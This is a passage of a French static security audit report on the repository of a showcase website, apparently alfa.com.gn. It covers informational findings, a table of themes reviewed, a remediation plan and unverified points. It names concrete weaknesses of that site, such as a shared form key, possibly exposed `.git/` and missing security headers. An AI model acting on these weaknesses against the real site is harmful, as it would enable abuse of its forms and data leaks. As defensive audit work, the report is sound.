const GOOGLE_ANALYTICS_ID = "G-XXXXXXXXXX";
const META_PIXEL_ID = "123456789012345";
```

Les deux fonctions de chargement **contrôlent explicitement la valeur factice avant tout appel réseau** (lignes 176-184 et 214-222) et sortent proprement. Aucun traceur n'est donc activé aujourd'hui, et aucune requête n'est émise vers `googletagmanager.com` ni `connect.facebook.net`. **Ce comportement est correct et constitue une bonne pratique.**

Point de vigilance : au moment de renseigner les identifiants réels, vérifier que la fonction `applyConsent()` (ligne 165) est bien le **seul** point d'activation, et que le consentement stocké en `localStorage` (clé `alfa_cookie_consent`, ligne 3) est correctement versionné — le mécanisme de version (`CONSENT_VERSION`, ligne 4, contrôlé ligne 149) est déjà en place et bien conçu.

---

### INFO-02 — Consentement stocké en `localStorage` plutôt qu'en cookie

**Fichier et lignes** : `js/cookies-consent.js:3`, `115-137`, `139-163`

Le choix de `localStorage` est **techniquement sain** (aucune transmission au serveur, pas de risque CSRF, portée limitée à l'origine). Deux limites à connaître :

* la preuve de consentement n'est pas exportable côté serveur en cas de contrôle d'une autorité ;
* la purge des données de navigation efface le choix, et la bannière réapparaît.

Aucune donnée personnelle n'est stockée : seuls trois booléens et un horodatage ISO (`savedAt`, ligne 121). **Conforme au principe de minimisation.**

---

### INFO-03 — Historique des soumissions conservé en `localStorage`

**Fichier et lignes** : `contact.html:685-698`, `index.html:818-836`

La clé `alfaFormSubmissions` ne contient que des horodatages numériques (`history.push(now)`, `contact.html:697`) — **aucune donnée personnelle**. Aucun risque de fuite. Point noté uniquement pour signaler que cette clé n'est jamais purgée : elle persiste indéfiniment dans le navigateur du visiteur, alors qu'une fenêtre glissante de 3 minutes suffit. Un nettoyage lors de la lecture serait plus propre.

---

### INFO-04 — Audit des dépendances impossible : aucun gestionnaire de paquets

**Fichiers concernés** : `package.json`, `package-lock.json` — **absents**

Le point 7 de la demande (« dépendances du `package.json` et leurs vulnérabilités ») **ne peut pas être traité** : le projet n'utilise aucun gestionnaire de paquets. `seo_update.js` n'importe que les modules natifs Node (`fs`, `path`, lignes 1-2), sans dépendance externe.

**Conséquence positive** : la surface d'attaque liée aux dépendances (`npm audit`, typosquatting, paquets transitifs compromis) est **nulle**. La dépendance externe réelle du projet passe exclusivement par les scripts tiers chargés à l'exécution — c'est-à-dire VULN-03, qui constitue le véritable risque de chaîne d'approvisionnement de ce site.

---

### INFO-05 — Bonnes pratiques constatées

Points positifs relevés lors de l'audit, à préserver :

| Bonne pratique | Vérification |
|---|---|
| `rel="noopener noreferrer"` sur **100 %** des liens `target="_blank"` | 26 liens `target="_blank"` / 26 avec `rel` — comptage exact sur les 12 pages |
| **Aucun contenu mixte** | Recherche de `http://` hors espaces de noms XML : **0 résultat** |
| **Aucun secret** dans l'historique Git | Balayage de tous les objets via `git rev-list --all` : **0 résultat** |
| **Aucune** utilisation de `eval()`, `new Function()`, `setTimeout("chaîne")` | Recherche exhaustive : **0 résultat** |
| **Aucun** `document.cookie` manipulé directement | Recherche exhaustive : **0 résultat** |
| `"use strict"` en tête des deux fichiers JS externes | `js/main.js:3`, `js/cookies-consent.js:1` |
| Consentement versionné avec invalidation automatique | `js/cookies-consent.js:4`, `149-152` |
| `anonymize_ip: true` sur la configuration Google Analytics | `js/cookies-consent.js:208-210` |
| Aucun `innerHTML` alimenté par une donnée utilisateur | Vérifié sur les 62 occurrences (§4) |
| Accessibilité soignée (`aria-expanded`, `aria-modal`, `aria-label`) | `js/main.js:14-15`, bannière cookies |

---

### INFO-06 — Incohérences documentaires mineures

| Élément | Constat |
|---|---|
| `cookies.html:207` | Date de dernière mise à jour : « 23 juillet 2026 » — vérifier la cohérence avec le calendrier de publication |
| `mentions-legales.html:209-213` | Rubrique « Hébergement » sans nom ni adresse d'hébergeur — mention légale incomplète dans la plupart des régimes |
| `mentions-legales.html:205-207` | Ni numéro RCCM, ni NIF, ni capital social, ni directeur de publication |
| Pieds de page des 12 pages | Liens morts `href="#"` : « Actualités » et icône X/Twitter (voir VULN-08) |
| `index.html:29`, `telechargement.html:32` | `<meta http-equiv="X-UA-Compatible" content="ie=edge" />` — vestige Internet Explorer, sans effet, présent sur 2 pages seulement |
| `confidentialite.html:268`, `363-369`, `417` | Mentions de Firebase Authentication, Cloud Messaging, Crashlytics, Analytics — **relatives à l'application mobile**, hors périmètre de ce dépôt (voir §6) |

---

## 4. Analyse détaillée par thème demandé

| # | Thème demandé | Verdict | Renvoi |
|---|---|---|---|
| 1 | **HTML / CSS / JavaScript** | 19 fichiers de code analysés intégralement. CSS sain : aucun `@import`, aucun `url()` externe, aucune expression dynamique. | §2.1 |
| 2 | **Formulaires et systèmes d'envoi** | 4 formulaires, tous vers `api.web3forms.com`. Aucun attribut `action`/`method` HTML (envoi 100 % `fetch`). Clé partagée, champs de routage côté client, contrôles anti-abus contournables. | VULN-01, VULN-07, VULN-14, VULN-15 |
| 3 | **XSS, injection HTML, redirections** | **Aucune XSS exploitable.** 62 occurrences de `innerHTML` examinées une à une : toutes reçoivent des chaînes littérales ou du contenu statique de la page. Le seul cas ambigu (`aide.html:957-964`) a été tranché par analyse du flux de données. Aucune redirection ouverte : `window.location.href` n'est affecté qu'en `telechargement.html:651` et `654`, à partir de littéraux. | VULN-09, VULN-10 |
| 4 | **Liens externes et URL non validées** | 26 liens `target="_blank"`, tous protégés par `rel="noopener noreferrer"`. Aucune URL construite dynamiquement à partir d'une entrée utilisateur. En revanche, deux liens sociaux pointent vers des comptes dont la propriété n'est pas établie. | VULN-08, INFO-05 |
| 5 | **Clés, jetons, mots de passe, secrets** | Un seul identifiant présent : la clé Web3Forms `003e9773-…` (publique par conception, mais partagée entre 4 formulaires). Deux identifiants factices neutralisés. **Aucun secret réel** dans les fichiers ni dans l'historique. | VULN-01, INFO-01, §2.4 |
| 6 | **`.env` et fichiers de configuration** | **Aucun `.env`, aucun fichier de configuration** dans le dépôt ni dans l'historique. L'absence de `.gitignore` constitue le risque préventif. | VULN-11, §2.3 |
| 7 | **Dépendances `package.json`** | **Non applicable** — aucun gestionnaire de paquets. Surface d'attaque « dépendances » nulle ; le risque de chaîne d'approvisionnement passe par les scripts tiers à l'exécution. | INFO-04, VULN-03 |
| 8 | **En-têtes CSP, HSTS, X-Frame-Options** | **Aucun en-tête de sécurité**, ni par balise `<meta>`, ni par fichier de configuration (absent du dépôt). Écart le plus structurant de l'audit. | VULN-02 |
| 9 | **Cookies, stockage local, données personnelles** | Aucun `document.cookie` manipulé par le code du site. `localStorage` : 2 clés, aucune donnée personnelle. Traceurs tiers chargés avant consentement. PII de partenaires vers Gmail personnel. | VULN-04, VULN-05, INFO-02, INFO-03 |
| 10 | **Web3Forms, hCaptcha, Firebase, Analytics, tiers** | Web3Forms + hCaptcha : actifs, non déclarés dans la politique. GA + Meta Pixel : présents mais neutralisés. Google Fonts + Google Translate : actifs sans consentement. **Firebase : aucune intégration dans ce dépôt** (mentions purement rédactionnelles). | VULN-01, VULN-03, VULN-04, INFO-01 |
| 11 | **Règles Firestore et Storage** | **Non vérifiable** — `firestore.rules`, `storage.rules`, `firebase.json` sont absents du dépôt et de tout son historique. | §6 |
| 12 | **Permissions excessives, contrôles d'accès** | Pas de système d'authentification ni d'autorisation dans ce périmètre. Le seul contrôle d'accès existant (limitation anti-spam) est appliqué côté client et donc inopérant. | VULN-07 |
| 13 | **Fichiers sensibles publiquement accessibles** | Aucun fichier sensible **par son contenu**. Risque structurel : `.git/` et `seo_update.js` probablement servis en production. | VULN-06 |
| 14 | **CORS, CSRF, XSS, injection, fuite, phishing** | **CORS** : aucun serveur propre, politique dictée par `api.web3forms.com`. **CSRF** : sans objet (pas de session ni de cookie d'authentification) ; le formulaire est ouvert par conception, ce qui est traité en VULN-01/VULN-07. **XSS/injection** : aucune exploitable. **Fuite** : IP transmises à Google sans consentement, PII vers Gmail. **Phishing** : liens sociaux non maîtrisés + usurpation possible de l'objet des courriels. | VULN-01, VULN-04, VULN-05, VULN-08 |
| 15 | **Mauvaises pratiques de sécurité et de qualité** | `document.write()` ×12, ~28 attributs `onclick=`, ~30 blocs `<script>` en ligne, quadruple duplication du code de soumission, échappement regex défectueux, réécriture HTML par regex. | VULN-09, VULN-12, VULN-13, VULN-15, VULN-16 |

---

## 5. Plan de remédiation priorisé

| Priorité | Action | Constat | Effort | Gain |
|:---:|---|---|:---:|:---:|
| **1** | Restreindre la clé Web3Forms au domaine `alfa.com.gn` dans le tableau de bord ; vérifier que `ccemail`/`redirect` sont désactivés | VULN-01 | 15 min | ⭐⭐⭐ |
| **2** | Vérifier `curl -I https://www.alfa.com.gn/.git/HEAD` — bloquer si `200` | VULN-06 | 15 min | ⭐⭐⭐ |
| **3** | Créer un `.gitignore` (avant toute intégration Firebase/FedaPay) | VULN-11 | 10 min | ⭐⭐⭐ |
| **4** | Publier les en-têtes de sécurité (`_headers` / `vercel.json` / `.htaccess`) | VULN-02 | 1 h | ⭐⭐⭐ |
| **5** | Activer et vérifier la protection captcha côté Web3Forms | VULN-07, VULN-14 | 30 min | ⭐⭐ |
| **6** | Auto-héberger les polices dans `assets/fonts/` | VULN-03, VULN-04 | 2 h | ⭐⭐ |
| **7** | Migrer le contact vers `contact@alfa.com.gn` avec MFA | VULN-05 | 2 h | ⭐⭐ |
| **8** | Compléter la liste des sous-traitants (Web3Forms, hCaptcha, Google) | VULN-04, VULN-05 | 1 h | ⭐⭐ |
| **9** | Vérifier et corriger les liens sociaux ; retirer les liens morts | VULN-08 | 30 min | ⭐⭐ |
| **10** | Conditionner Google Translate au consentement | VULN-04 | 3 h | ⭐⭐ |
| **11** | Corriger `escapeRegExp` + `try/catch` dans `aide.html` | VULN-09 | 30 min | ⭐ |
| **12** | Rendre `smartLink()` défensif (table de correspondance) | VULN-10 | 30 min | ⭐ |
| **13** | Mutualiser le code de soumission dans `js/form-handler.js` | VULN-15 | 4 h | ⭐ |
| **14** | Externaliser les scripts en ligne, puis durcir la CSP | VULN-12, VULN-13 | 1-2 j | ⭐⭐ |
| **15** | Cible : proxy serveur pour les formulaires (secret côté serveur) | VULN-01, VULN-07 | 1-2 j | ⭐⭐⭐ |

---

## 6. Points non vérifiables dans le cadre de cet audit

Les éléments suivants **n'ont pas pu être vérifiés** car ils se situent hors du périmètre du dépôt. Ils constituent des **angles morts assumés** de ce rapport.

| # | Élément non vérifié | Motif | Constat impacté |
|---|---|---|---|
| 1 | **Configuration du compte Web3Forms** | Hors dépôt (tableau de bord du prestataire). Restriction par domaine, activation réelle de hCaptcha, acceptation de `ccemail`/`redirect`/`replyto` : inconnues. **Détermine directement la gravité réelle de VULN-01.** | VULN-01, VULN-07, VULN-14 |
| 2 | **En-têtes HTTP réellement servis en production** | Aucun fichier de configuration d'hébergement dans le dépôt ; l'hébergeur peut en injecter par défaut. Vérification requise via `curl -I https://www.alfa.com.gn/`. | VULN-02 |
| 3 | **Exposition effective de `.git/` et `seo_update.js`** | Dépend de la méthode de déploiement, non documentée dans le dépôt. | VULN-06 |
| 4 | **Règles Firestore et Storage** | `firestore.rules` / `storage.rules` / `firebase.json` absents du dépôt **et de tout son historique**. Firebase est mentionné dans `confidentialite.html:268, 363-369, 417` mais concerne **l'application mobile**, qui réside dans un autre dépôt. **Le point 11 de la demande ne peut pas être traité ici.** | Point 11 |
| 5 | **Code de l'application mobile alfa** | Hors périmètre : ce dépôt ne contient que le site vitrine. Authentification, autorisations, chiffrement, paiement FedaPay ne sont pas auditables ici. | Points 11, 12 |
| 6 | **Intégration FedaPay** | Annoncée dans `confidentialite.html:424-427`, **aucun code correspondant** dans ce dépôt. | Point 10 |
| 7 | **Contenu binaire des 74 images** | Inventoriées et listées, mais métadonnées EXIF (géolocalisation, identité de l'appareil), stéganographie et fichiers polyglottes non analysés — hors des capacités d'une revue de code statique. | §2.2 |
| 8 | **Configuration DNS, TLS et messagerie du domaine** | SPF, DKIM, DMARC, version TLS, qualité du certificat : non consultables depuis le dépôt. Pertinent au vu de VULN-01 (usurpation d'expéditeur). | VULN-01 |
| 9 | **Propriété réelle des comptes sociaux** | `facebook.com/alfa` et `instagram.com/alfa.guinee` : impossible de déterminer depuis le code s'ils appartiennent à alfa. | VULN-08 |
| 10 | **Comportement à l'exécution** | Audit exclusivement statique, en lecture seule : aucun test dynamique, aucune requête réseau, aucun rendu de page n'a été effectué. Les conclusions reposent sur la lecture du code. | Ensemble |

---

## 7. Résultats de l'audit

### 7.1 Fichiers examinés

| Catégorie | Nombre |
|---|---:|
| Fichiers HTML analysés intégralement | **12** |
| Fichiers JavaScript analysés intégralement | **3** |
| Fichiers CSS analysés | **2** |
| Fichiers de configuration / SEO analysés | **2** (`robots.txt`, `sitemap.xml`) |
| **Sous-total code et configuration** | **19** |
| Fichiers binaires inventoriés (74 images + 1 `.gitkeep`) | **75** |
| **Total des fichiers suivis examinés** | **94** |
| Commits de l'historique balayés | **3** (100 % via `git rev-list --all`) |
| Fichiers de configuration recherchés et confirmés absents | **16** |

### 7.2 Répartition des constats par gravité

| Gravité | Nombre | Références |
|---|---:|---|
| 🔴 **CRITIQUE** | **0** | — |
| 🟠 **ÉLEVÉ** | **3** | VULN-01, VULN-02, VULN-03 |
| 🟡 **MOYEN** | **6** | VULN-04, VULN-05, VULN-06, VULN-07, VULN-08, VULN-09 |
| 🔵 **FAIBLE** | **7** | VULN-10, VULN-11, VULN-12, VULN-13, VULN-14, VULN-15, VULN-16 |
| ⚪ **INFORMATIONNEL** | **6** | INFO-01 à INFO-06 |
| | **22** | |

**Répartition par statut** : 13 constats ✅ **confirmés** · 3 constats ⚠️ **suspicion** (VULN-06, VULN-08, VULN-14) · 1 constat à **double statut** (VULN-01 : exposition confirmée, abus suspecté) · 1 hypothèse ❌ **explicitement écartée** après analyse (XSS dans `aide.html` — VULN-09).

### 7.3 Conclusion

L'architecture statique du site élimine par construction les vulnérabilités les plus graves : **aucune injection SQL, aucune exécution de code à distance, aucun contournement d'authentification, aucune XSS exploitable, aucun secret réel exposé** n'ont été identifiés. Le code présente par ailleurs plusieurs bonnes pratiques réelles (`rel="noopener noreferrer"` systématique, absence totale de contenu mixte, absence de `eval()`, consentement versionné, `anonymize_ip` activé).

Les trois constats de gravité ÉLEVÉE relèvent tous de la **configuration du périmètre** plutôt que de défauts du code applicatif : un identifiant tiers partagé sans restriction vérifiable, l'absence d'en-têtes de sécurité, et des scripts tiers non verrouillés. Les quatre premières actions du plan de remédiation (§5) demandent **moins de deux heures au total** et traitent les risques les plus structurants.

---

*Rapport généré le 25 juillet 2026 — audit statique en lecture seule du dépôt `alfa_website`, branche `main`, commit `89daccb`.*
*Aucun fichier source n'a été modifié. Aucun commit, aucune branche et aucune Pull Request n'ont été créés.*
